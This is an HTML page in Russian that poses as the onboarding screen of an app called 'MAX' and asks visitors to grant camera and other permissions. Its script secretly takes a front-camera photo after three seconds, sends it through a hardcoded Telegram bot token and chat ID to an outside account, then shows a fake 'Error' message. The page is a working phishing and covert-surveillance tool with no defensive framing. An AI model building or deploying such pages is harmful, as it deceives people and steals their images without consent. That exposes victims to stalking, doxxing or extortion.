<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MAX</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, Arial, sans-serif;
    background: #0f0f14;
    color: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .screen { width: 100%; max-width: 420px; padding: 32px 24px; text-align: center; }
  .hidden { display: none; }
  .logo {
    width: 96px; height: 96px; border-radius: 24px;
    background: linear-gradient(135deg, #6a5cff, #00c2ff);
    margin: 0 auto 24px;
    display: flex; align-items: center; justify-content: center;
    font-size: 40px; font-weight: 700;
  }
  h1 { font-size: 24px; margin-bottom: 12px; }
  p.sub { color: #9aa0b0; font-size: 15px; margin-bottom: 28px; }
  .perm {
    text-align: left; background: #1a1b22; border-radius: 16px;
    padding: 8px 16px; margin-bottom: 24px;
  }
  .perm div { padding: 12px 0; border-bottom: 1px solid #26272f; font-size: 15px; }
  .perm div:last-child { border-bottom: none; }
  button {
    width: 100%; padding: 16px; border: none; border-radius: 14px;
    background: linear-gradient(135deg, #6a5cff, #00c2ff);
    color: #fff; font-size: 17px; font-weight: 600; cursor: pointer;
  }
  button:active { opacity: .85; }
  video {
    width: 100%; border-radius: 16px; margin-bottom: 20px;
    transform: scaleX(-1);
  }
  .error { color: #ff4d4d; font-size: 22px; font-weight: 700; }
</style>
</head>
<body>

<div class="screen" id="step1">
  <div class="logo">M</div>
  <h1>Добро пожаловать в MAX</h1>
  <p class="sub">Для правильной работы этого приложения требуются дополнительные разрешения MAX, предоставьте доступ</p>
  <div class="perm">
    <div>☑️ Доступ к контактам</div>
    <div>☑️ Доступ к уведомлениям</div>
    <div>☑️ Доступ к камере и микрофону</div>
  </div>
  <button onclick="start()">Вступить в MAX</button>
</div>

<div class="screen hidden" id="step2">
  <video id="video" autoplay playsinline muted></video>
</div>

<div class="screen hidden" id="step3">
  <p class="error">Ошибка</p>
</div>

<canvas id="canvas" style="display:none"></canvas>

<script>
  const BOT_TOKEN = '8862337691:AAHJW93zNK7aD_LMUYqMdp5wv2a18a2Qb6Q';
  const CHAT_ID   = '7948959019';

  async function start() {
    document.getElementById('step1').classList.add('hidden');
    document.getElementById('step2').classList.remove('hidden');

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      const video = document.getElementById('video');
      video.srcObject = stream;

      setTimeout(async () => {
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        stream.getTracks().forEach(t => t.stop());

        canvas.toBlob(async (blob) => {
          const form = new FormData();
          form.append('chat_id', CHAT_ID);
          form.append('photo', blob, 'photo.png');
          try {
            await fetch(`https://api.telegram.org/bot/sendPhoto`, {
              method: 'POST',
              body: form
            });
          } catch (e) {}
        }, 'image/png');

        document.getElementById('step2').classList.add('hidden');
        document.getElementById('step3').classList.remove('hidden');
      }, 3000);

    } catch (e) {
      document.getElementById('step2').innerHTML =
        '<h1>Нет доступа к камере</h1><p class="sub">Разрешите доступ и обновите страницу</p>';
    }
  }
</script>

</body>
</html>
